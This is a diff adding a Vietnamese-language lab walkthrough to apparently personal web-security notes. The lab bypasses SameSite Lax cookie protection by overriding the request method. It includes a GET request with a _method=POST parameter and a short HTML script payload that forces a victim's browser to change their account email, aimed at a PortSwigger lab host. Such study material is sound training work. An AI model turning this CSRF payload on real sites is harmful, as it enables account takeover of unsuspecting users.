@@ -245,6 +245,30 @@ Set-Cookie: csrf=xnxx; SameSite=None; Secure; HttpOnly
 - Dán mã khai thác vào body 
 - Deliver to victim
 
+### Lab: SameSite Lax bypass via method override
+#### Determine type of **SameSite**
+- Login bằng tài khoản được cấp
+- Thực hiện **change-email**
+- Quan sát các response, nhận thấy được không có SameSite nào được server chỉ định 
+=> SameSite Lax được sử dụng mặc định bởi **Chrome**
+
+#### Exploit
+- Thay đổi method và thực hiện change-email => `"Method Not Allowed"`
+- Overwrite method => thành công
+```http
+GET /my-account/change-email?email=evil%40gmail.com&_method=POST HTTP/2
+Host: 0a4d00ba046d90da817a8e1300b0005c.web-security-academy.net
+```
+- Tạo mã khai thác
+```html
+<script>
+    document.location="https://0a4d00ba046d90da817a8e1300b0005c.web-security-academy.net/my-account/change-email?email=evil%40gmail.com&_method=POST";
+</script>
+```
+- Deliver to victim
+> Tham số _method sẽ **chỉ có hiệu lực nếu phía server (framework) hỗ trợ và xử lý nó. 
+{: .promt-info}
+
 
 ## Prevent
 ---
